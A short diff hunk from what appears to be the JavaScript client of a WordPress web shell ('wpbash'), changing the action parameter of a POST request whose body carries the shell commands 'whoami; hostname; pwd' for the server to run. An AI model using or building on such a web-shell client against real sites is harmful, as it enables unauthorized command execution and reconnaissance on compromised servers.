@@ -35,7 +35,7 @@
 
             request.open("POST", pageURL, true);
             request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-            request.send("cmd=whoami; hostname; pwd; action=wp_ajax_wpbash");
+            request.send("cmd=whoami; hostname; pwd; action=wpbash");
         }
                     
         function sendCommand() {
